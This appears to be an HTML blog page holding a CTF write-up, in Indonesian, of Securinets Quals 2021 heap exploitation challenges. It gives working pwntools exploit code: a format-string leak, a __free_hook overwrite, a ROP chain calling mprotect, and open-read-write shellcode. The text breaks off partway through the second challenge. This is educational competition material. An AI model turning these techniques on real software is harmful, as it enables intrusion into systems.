@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+<html lang="en" data-mode="dark">
+  <head prefix="og: http://ogp.me/ns#">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hugo 0.75.1">
+<meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<title>Securinets Quals 2021 - Binary Exploit | Amadeus</title>
+
+
+<meta name="author" content="abdullah">
+<meta name="description" content="First note, aku mengerjakan ini semalam setelah kompetisi selesai. Iseng-iseng buka ctftime, di running event ada ini. Tapi, ternyata waktu -1 jam selesai event ini :&#39;(. Untuk solver dan source challanges bisa didownload disini.">
+
+
+<meta name="robots" content="index follow">
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+
+
+
+  
+    <link rel="canonical" href="https://example.com/posts/securinet/pwn/">
+  
+
+
+
+
+
+
+
+
+<meta property="og:site_name" content="Amadeus">
+<meta property="og:title" content="Securinets Quals 2021 - Binary Exploit">
+<meta property="og:description" content="First note, aku mengerjakan ini semalam setelah kompetisi selesai. Iseng-iseng buka ctftime, di running event ada ini. Tapi, ternyata waktu -1 jam selesai event ini :&#39;(. Untuk solver dan source challanges bisa didownload disini.">
+  <meta property="og:url" content="https://example.com/posts/securinet/pwn/">
+
+
+
+
+
+
+
+
+  <meta property="og:type" content="article">
+  
+  
+    <meta property="article:published_time" content="2021-04-10">
+    <meta property="article:modified_time" content="2021-04-10">
+    <meta property="og:updated_time" content="2021-04-10">
+  
+
+  
+    <meta property="article:author" content="abdullah">
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="theme-color" content="#222">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebSite",
+        "@id": "https:\/\/example.com\/"
+      },
+      "headline": "Securinets Quals 2021 - Binary Exploit",
+      "description": "First note, aku mengerjakan ini semalam setelah kompetisi selesai. Iseng-iseng buka ctftime, di running event ada ini. Tapi, ternyata waktu -1 jam selesai event ini :'(. Untuk solver dan source challanges bisa didownload disini.",
+      
+      "url": "https:\/\/example.com\/posts\/securinet\/pwn\/",
+      "inLanguage": "en",
+      "datePublished": "2021-04-10",
+      "dateModified": "2021-04-10",
+      "wordCount" : "2521",
+      "publisher": {
+        "@type": "Person",
+        "name": "abdullah"
+      },
+      "author": {
+        "@type": "Person",
+        "name": "abdullah",
+        
+        
+      }
+    }
+  </script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.css">
+
+
+
+<noscript>
+
+  
+  
+
+  
+    <meta name="theme-color" content="#dd587c" media="(prefers-color-scheme: dark)">
+    <meta name="theme-color" content="#e0e0e0" media="(prefers-color-scheme: light)">
+  
+
+  <style>
+  
+    html {
+      --accent: #dd587c;
+    }
+  
+    .req-js {
+      display: none;
+    }
+    
+  </style>
+  
+</noscript>
+
+
+
+
+
+
+  <link rel="preload" href="/fonts/iosevka-prag.ttf" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff" as="font" crossorigin="anonymous">
+
+  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script>
+    
+      'use strict';
+
+// Get default accent colors
+
+
+
+// Get CSS transition
+
+
+// =================================================
+// Mode switcher + Custom accent color
+// Based on: https://gist.github.com/regpaq/04c67e8aceecbf0fd819945835412d1f
+// =================================================
+
+
+  // New prefers-color-scheme media query to detect OS light/dark mode setting
+  const PREFERS_LIGHT = window.matchMedia('(prefers-color-scheme: light)');
+  const PREFERS_DARK = window.matchMedia('(prefers-color-scheme: dark)');
+
+
+const ROOT = document.documentElement;
+
+const SHEET = document.documentElement.style;
+const META_THEME_COLOR = document.querySelector('meta[name=theme-color]');
+
+// Set the dark
+function setDark() {
+  ROOT.dataset.mode = 'dark'
+};
+
+// Set the light
+function setLight() {
+  ROOT.dataset.mode = 'light'
+};
+
+// Initialization triggers light/dark mode based on prior preference, then OS setting
+// And yes, I know 'true' here is a string
+if(localStorage.getItem('isDark') == 'true') {
+  setDark()
+} else if(localStorage.getItem('isDark') == 'false') {
+  setLight()
+
+  
+    } else if(PREFERS_DARK.matches) {
+      setDark()
+    } else if(PREFERS_LIGHT.matches) {
+      setLight()
+  
+
+};
+
+
+
+
+// TODO
+// Maybe I should rethink this ...
+function getAccent() {
+  if (ROOT.dataset.mode === 'dark') {
+  
+    if (localStorage.getItem('darkAccent') === null) {
+      
+      
+      
+      var currentAccent = "#dd587c"
+    } else {
+    
+      var currentAccent = localStorage.getItem('darkAccent')
+      
+      
+      
+    }
+  } else if (ROOT.dataset.mode === 'light') {
+
+    if (localStorage.getItem('lightAccent') === null) {
+  
+      
+      
+
+      var currentAccent = "#e0e0e0"
+    } else {
+      var currentAccent = localStorage.getItem('lightAccent')
+      
+      
+      
+    }
+  };
+  
+  return currentAccent
+};
+
+var activeAccent = getAccent();
+
+// Set the active accent color for these right after setting mode color
+// Should mitigate any flickering
+SHEET.setProperty('--accent', activeAccent);
+
+// Also meta-theme cuz, why not
+META_THEME_COLOR.setAttribute('content', activeAccent);
+
+
+function updateAccent() {
+  var activeAccent = getAccent();
+
+  SHEET.setProperty('--accent', activeAccent);
+  PALETTE.value = activeAccent;
+  META_THEME_COLOR.setAttribute('content', activeAccent);
+};
+
+
+document.addEventListener('DOMContentLoaded', function () {
+
+  // Update the color picker with the active accent color 
+  PALETTE.value = activeAccent;
+
+  // Smooth transition, only when changing modes (and not loading pages)
+  function smoothTransition() {
+    document.body.style.transition 
+    = document.querySelector('header').style.transition
+    = document.querySelector('footer').style.transition
+    = 'background-color .3s ease, color .3s ease'
+  };
+  
+  // Give the user a choice
+  function userModeChange() {
+  
+    smoothTransition();
+
+    if (ROOT.dataset.mode == 'light') {
+      setDark();
+      localStorage.setItem('isDark', 'true')
+
+      
+      
+    } else {
+      setLight();
+      localStorage.setItem('isDark', 'false')
+      
+      
+      
+    };
+    
+    updateAccent()
+  };
+
+  
+  // TEST
+  // Keyboard shortcut for mode change, here for testing purposes only
+  // CTRL + ALT + M
+  
+
+
+  
+  
+    // Runs when OS changes light/dark mode. Changes only if you were on default
+    // color state (light on light mode, dark on dark mode).
+    function OSModeChange() {
+    
+      smoothTransition();
+      
+      if (PREFERS_LIGHT.matches) {
+        setLight();
+        localStorage.setItem('isDark', 'false')
+
+        
+        
+      } else if (PREFERS_DARK.matches) {
+        setDark();
+        localStorage.setItem('isDark', 'true')
+        
+        
+      };
+      
+      updateAccent()
+    };
+
+    // Listeners for when you change OS setting for light/dark mode
+    PREFERS_LIGHT.addListener(OSModeChange);
+    PREFERS_DARK.addListener(OSModeChange);
+  
+  
+  
+  // Mode change button
+  document.querySelector('footer button')
+    .addEventListener('click', userModeChange)
+})
+
+    
+  </script>
+
+
+
+  </head>
+
+  <body>
+
+    <header>
+      
+
+  <a href="/">Amadeus</a>
+
+
+
+
+  
+    <nav aria-label="Main menu.">
+      <ul>
+        
+          <li>
+            <a class="btn" href="/about/">About</a>
+          </li>
+        
+          <li>
+            <a class="btn" href="/posts/">Posts</a>
+          </li>
+        
+      </ul>
+    </nav>
+  
+
+
+    </header>
+
+    <div class="filler">
+      
+
+  <main>
+    <article>
+      <header>
+        
+        
+
+        
+          <section class="terms">
+            <ul><li class="category"><a class="btn" href="/categories/binary-exploit/">Binary Exploit</a></li><li class="category"><a class="btn" href="/categories/writeup/">WriteUp</a></li></ul>
+          </section>
+          <p>
+            
+              Published on <time datetime="2021-04-10">2021-04-10</time> 
+            
+            
+            
+            <strong>|</strong> written by abdullah
+          </p>
+        
+        
+        
+        
+      </header>
+    
+      
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+<p>First note, aku mengerjakan ini semalam setelah kompetisi selesai. Iseng-iseng buka ctftime, di running event ada ini. Tapi, ternyata waktu -1 jam selesai event ini :'(.</p>
+<p>Untuk solver dan source challanges bisa didownload <a href="../source/source.zip">disini</a>.</p>
+
+
+
+
+
+  <h1 id="kill-shot">Kill Shot</h1> 
+
+<p>Simplenya, kita diberi <code>printf</code> yang parameternya kita kontrol untuk mendapakan leak, dan fungsi <code>kill</code> untuk <code>write-what-where</code>. Setelahnya, diberi <code>add</code> dan <code>delete</code> yang secara berurutan fungsi tersebut menggunakan <code>malloc</code> dan <code>free</code> seperti heap exploitation pada umumnya. Sejauh yang aku baca, tidak ada bug pada 2 fungsi tersebut.</p>
+
+
+
+
+
+  <h2 id="analysist"><a class="anchor" href="#analysist" title='Anchor for "Analysist".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Analysist</h2> 
+
+<p>Kita mempunyai infomation leaks pada fungsi <code>sub_FE3</code> yang dipanggil diawal program. Dan arbitrary-write pada fungsi <code>kill</code>. Dua fungsi tersebut bisa kita manfaatkan untuk exploitasi binary ini.</p>
+<p>Binary ini menggunakan <code>seccomp</code> untuk menfilter system call yang diizinkan oleh binary. Karena ini, inject shellcode mungkin diperlukan (?).</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py">  <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
+  <span class="o">=================================</span>
+  <span class="mo">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
+  <span class="mo">0001</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x09</span> <span class="mh">0xc000003e</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
+  <span class="mo">0002</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
+  <span class="mo">0003</span><span class="p">:</span> <span class="mh">0x35</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x40000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">&lt;</span> <span class="mh">0x40000000</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0005</span>
+  <span class="mo">0004</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x06</span> <span class="mh">0xffffffff</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
+  <span class="mo">0005</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x04</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">read</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0010</span>
+  <span class="mo">0006</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x03</span> <span class="mh">0x00</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">write</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0010</span>
+  <span class="mo">0007</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x02</span> <span class="mh">0x00</span> <span class="mh">0x00000005</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">fstat</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0010</span>
+  <span class="mo">000</span><span class="mi">8</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x01</span> <span class="mh">0x00</span> <span class="mh">0x0000000a</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">==</span> <span class="n">mprotect</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0010</span>
+  <span class="mo">000</span><span class="mi">9</span><span class="p">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000101</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">openat</span><span class="p">)</span> <span class="n">goto</span> <span class="mo">0011</span>
+  <span class="mo">0010</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+  <span class="mo">0011</span><span class="p">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+</code></pre></div>
+
+
+
+
+  <h2 id="exploit"><a class="anchor" href="#exploit" title='Anchor for "Exploit".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Exploit</h2> 
+
+<p>Information leaks (pie, libc, heap, etc), didapatkan pada fungsi <code>sub_FE3</code> yang sudah aku tulis diatas.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%4$p||%6$p||%25$p||%13$p&#34;</span> 
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Format: &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">leaks</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;||&#39;</span><span class="p">)</span>
+</code></pre></div><p>Pertama, dengan fungsi <code>kill</code>, overwrite <code>__free_hook</code> ke fungsi <code>kill</code> untuk dapat arbitrary-write terus-menerus. Panggil <code>free</code> untuk mentriggernya.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Pointer: &#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{libc.sym.__free_hook}&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Content: &#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">kill</span><span class="p">))</span>
+
+<span class="c1"># pwndbg&gt; tel &amp;__free_hook 1</span>
+<span class="c1"># 00:0000 │ 0x1555553268e8 (__free_hook) —▸ 0x5555555550b4 (kill) ◂— push   rbp</span>
+</code></pre></div><p>Arbitrary-write ini akan digunakan untuk tulis ropchain ke <code>RIP</code> yang akan panggil <code>mprotect</code> untuk membuat heap memory memiliki executable permission. Yang pada akhirnya kita akan return ke shellcode kita untuk mendapatkan flagnya.</p>
+<p>Sekarang, siapkan shellcodenya. Ini karena kita harus kalkulasi address shellcode kita di heap dengan leaked heap address yang didapatkan tadi, yang nantinya address ini adalah tempat kembali kita setelah membuat memori heap menjadi executable.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="c1"># open-read-write shellcode (nice pwntools!)</span>
+<span class="n">shellcode</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">openat</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;/home/ctf/flag.txt&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">)</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mh">0xC8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+
+<span class="c1"># pwndbg&gt; dq 0x5555557580f0-0x10</span>
+<span class="c1"># 00005555557580e0     0000000000000001 00000000000000d1</span>
+<span class="c1"># 00005555557580f0     2434810101757968 2f66b84801010101</span>
+<span class="c1">#                                    ^^ our shellcode start here</span>
+<span class="c1"># 0000555555758100     4850742e67616c66 632f656d6f682fb8</span>
+<span class="c1"># 0000555555758110     31ff31e689485074 0f0101b866c031d2</span>
+
+<span class="n">shellcode_start</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0xE90</span>
+
+<span class="c1"># pwndbg&gt; p/x 0x5555557580f0-0x555555757260</span>
+<span class="c1"># $2 = 0xe90</span>
+</code></pre></div><p>Sekarang tinggal ropchain untuk ubah permission heap menjadi executable, lalu return ke shellcode tadi.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">stack_rip</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">-</span> <span class="mh">0xD8</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">],</span> <span class="p">[</span><span class="n">heap</span> <span class="o">-</span> <span class="mh">0x260</span><span class="p">,</span> <span class="mh">0x21000</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">])</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_start</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+    <span class="n">kill</span><span class="p">(</span><span class="n">stack_rip</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="p">:</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])</span>
+</code></pre></div><p>Exit untuk trigger ropchain dan ret ke shellcode. Sekarang <code>heap memory</code> memiliki permission executable.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span> <span class="n">heap</span>
+<span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+    <span class="mh">0x555555757000</span>     <span class="mh">0x555555778000</span> <span class="n">rwxp</span>    <span class="mi">21000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
+</code></pre></div>
+
+
+
+
+  <h2 id="footnote"><a class="anchor" href="#footnote" title='Anchor for "Footnote".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Footnote</h2> 
+
+<p>Intended Solution dari author, adalah overwrite <code>fastbinY</code> agar menunjuk ke <code>stack</code>. Agar malloc mengembalikan pointer dalam range <code>stack</code>. Malloc ke-N akan me-return alamat <code>stack</code> yang berisi address dari <code>RIP</code>. Dan melakukan ropchain open-read-write, menggunakan <code>openat</code>.</p>
+
+
+
+
+
+  <h2 id="flag"><a class="anchor" href="#flag" title='Anchor for "Flag".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Flag</h2> 
+
+<pre aria-label="Box containing code sample." tabindex=0><code>flag{this_really_needs_a_kill_shot!_cc5dcc74acd62fa74899efaff22d8f79}
+</code></pre>
+
+
+
+
+  <h1 id="death-note">Death Note</h1> 
+
+<p>Heap exploitation klasik dengan fungsi create, edit, view, delete seperti pada umumnya.</p>
+
+
+
+
+
+  <h2 id="analysist-1"><a class="anchor" href="#analysist-1" title='Anchor for "Analysist".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Analysist</h2> 
+
+<p>Create melakukan malloc dengan size dari user dengan constraint, <code>0 &gt; size &lt; 0x100</code>. Dengan index array mencari yang kosong dan ditentukan oleh sistem. Data array hanya berukuran 10.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">create</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">void</span> <span class="o">**</span><span class="n">note_ptr</span><span class="p">;</span> <span class="c1">// rbx@5
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@5
+</span><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+8h] [bp-18h]@1
+</span><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [sp+Ch] [bp-14h]@3
+</span><span class="c1"></span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Enough targets for today!&#34;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">gdata</span><span class="p">)</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Provide note size:&#34;</span><span class="p">,</span> <span class="mh">0x12uLL</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0xFF</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wrong size!&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">note_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">gdata</span> <span class="o">+</span> <span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span><span class="p">);</span>
+    <span class="o">*</span><span class="n">note_ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+    <span class="n">gsize</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Note is created at index: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>Edit ini melakukan read array yang sudah diallokasikan oleh user dengan constraint <code>index &lt; 9</code>.</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-c" data-lang="c"><span class="n">ssize_t</span> <span class="nf">edit</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">ssize_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax@3
+</span><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> <span class="c1">// [sp+Ch] [bp-4h]@1
+</span><span class="c1"></span>
+  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Provide note index: &#34;</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="n">read_long</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;The death note isn&#39;t that big unfortunately</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x2CuLL</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">index</span> <span class="o">+</span> <span class="n">gdata</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Name: &#34;</span><span class="p">,</span> <span class="mi">6uLL</span><span class="p">);</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">index</span> <span class="o">+</span> <span class="n">gdata</span><span class="p">),</span> <span class="n">gsize</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Page doesn&#39;t even exist!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0x19uLL</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>Delete akan melakukan <code>free</code> ke index yang sudah diallokasikan dan ditentukan oleh user. Setelah di-free, pointer di set menjadi <code>null</code>, <em>no uaf here</em>. Dan view akan mengoutputkan informasi data dari index yang diberikan.</p>
+
+
+
+
+
+  <h2 id="bug"><a class="anchor" href="#bug" title='Anchor for "Bug".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Bug</h2> 
+
+<p>Bugnya secara jelas ada di <code>edit</code>. Karena contraint hanya <code>index &lt; 9</code> dengan bilangan negatif ini akan lolos. Ini bisa digunakan untuk edit pointer-pointer yang ada diatas <code>array_data_notes</code>.</p>
+
+
+
+
+
+  <h2 id="exploit-1"><a class="anchor" href="#exploit-1" title='Anchor for "Exploit".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a> Exploit</h2> 
+
+<p>Untuk mempermudah interaksi dengan soal,</p>
+<div class="highlight"><pre class="chroma" aria-label="Box containing code sample." tabindex=0><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Exit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">f</span><span class="s1">&#39;{size}&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
